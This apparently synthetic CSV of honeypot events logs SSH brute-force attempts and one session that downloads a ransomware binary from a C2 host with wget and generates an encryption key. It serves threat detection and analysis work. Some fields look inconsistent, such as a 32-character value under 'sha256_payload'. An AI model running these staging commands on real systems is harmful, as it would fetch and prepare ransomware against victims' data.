event_id,session_id,timestamp,event_type,honeypot_id,src_ip,src_port,dst_ip,dst_port,protocol,username,password,login_success,command,command_index,country,asn,isp,attack_type,mitre_technique_id,mitre_technique_name,severity,file_downloaded,c2_ip,sha256_payload,session_duration_sec,bytes_sent,bytes_received,alert_tag,false_positive,thehive_case_id,misp_event_uuid,analyst_note
EVT-001649,0702AF60,2025-01-02T08:27:20Z,login_attempt,hp-eu-02,46.101.90.205,33140,10.0.1.11,22,ssh,chef,Juniper1!,False,,0,DE,AS14061,DigitalOcean DE,Rootkit/Persistence,T1110,Brute Force,medium,,,,325,603,2601,brute_force,False,,,
EVT-002076,574088F2,2025-01-02T14:37:59Z,login_attempt,hp-us-01,5.188.206.26,60543,10.0.2.10,22,ssh,postgres,root123,False,,0,RU,AS50673,Serverius,Lateral Movement,T1110,Brute Force,medium,,,,41,652,1182,brute_force,False,,,
EVT-003412,21B2CE54,2025-01-02T14:41:39Z,login_attempt,hp-eu-01,103.124.104.50,41987,10.0.1.10,22,ssh,www-data,welcome1,True,,0,CN,AS45090,Tencent Cloud,Ransomware Staging,T1110,Brute Force,high,,,,431,321,2191,compromised_login,False,,92e15842-3b1c-4056-9ae5-fb91442e8b3d,
EVT-003414,21B2CE54,2025-01-02T14:41:51Z,command_executed,hp-eu-01,103.124.104.50,45366,10.0.1.10,22,ssh,www-data,welcome1,True,df -h && lsblk,2,CN,AS45090,Tencent Cloud,Ransomware Staging,T1082,System Information Discovery,low,,,,431,555,443,ransomware_staging,False,,b1da5047-7beb-43a3-9289-beca4e1a5cfb,
EVT-003417,21B2CE54,2025-01-02T14:41:54Z,command_executed,hp-eu-01,103.124.104.50,33903,10.0.1.10,22,ssh,www-data,welcome1,True,ls /mnt /media /backup 2>/dev/null,5,CN,AS45090,Tencent Cloud,Ransomware Staging,T1059,Command and Scripting Interpreter,low,,,,431,517,181,ransomware_staging,False,,e2da2248-8478-43ed-9275-d4850cedb65a,
EVT-003413,21B2CE54,2025-01-02T14:42:03Z,command_executed,hp-eu-01,103.124.104.50,57447,10.0.1.10,22,ssh,www-data,welcome1,True,uname -a && id,1,CN,AS45090,Tencent Cloud,Ransomware Staging,T1082,System Information Discovery,low,,,,431,438,152,ransomware_staging,False,,1bc45e42-b028-41ef-8852-a30dd946dc06,
EVT-003419,21B2CE54,2025-01-02T14:42:14Z,command_executed,hp-eu-01,103.124.104.50,55049,10.0.1.10,22,ssh,www-data,welcome1,True,wget -q http://45.142.212.100/ransom/locker_x64 -O /tmp/.locker,7,CN,AS45090,Tencent Cloud,Ransomware Staging,T1105,Ingress Tool Transfer,critical,yes,45.142.212.100,9b02c5d4bff749a0b4de924c5a149185,431,551,216,ransomware_staging,False,,ca373c7e-f278-4feb-8277-0b8cc491a1d4,
EVT-003415,21B2CE54,2025-01-02T14:42:36Z,command_executed,hp-eu-01,103.124.104.50,47463,10.0.1.10,22,ssh,www-data,welcome1,True,find / -type f -name '*.py' -o -name '*.java' -o -name '*.go' 2>/dev/null | wc -l,3,CN,AS45090,Tencent Cloud,Ransomware Staging,T1059,Command and Scripting Interpreter,low,,,,431,293,202,ransomware_staging,False,,0f0d8619-3a53-4545-bab0-8f4c3cb66b22,
EVT-003421,21B2CE54,2025-01-02T14:42:42Z,command_executed,hp-eu-01,103.124.104.50,36097,10.0.1.10,22,ssh,www-data,welcome1,True,openssl genrsa -out /tmp/victim.key 2048 2>/dev/null,9,CN,AS45090,Tencent Cloud,Ransomware Staging,T1486,Data Encrypted for Impact,critical,,,,431,195,141,ransomware_staging,False,,d402d5b5-3f73-4cd5-932b-96f59b6d4f29,
EVT-003416,21B2CE54,2025-01-02T14:43:43Z,command_executed,hp-eu-01,103.124.104.50,45573,10.0.1.10,22,ssh,www-data,welcome1,True,find /home /var/www /opt /srv -type f 2>/dev/null | wc -l,4,CN,AS45090,Tencent Cloud,Ransomware Staging,T1083,File and Directory Discovery,low,,,,431,372,61,ransomware_staging,False,,ccd05547-d29b-40f9-b9ab-95dc445d4a95,
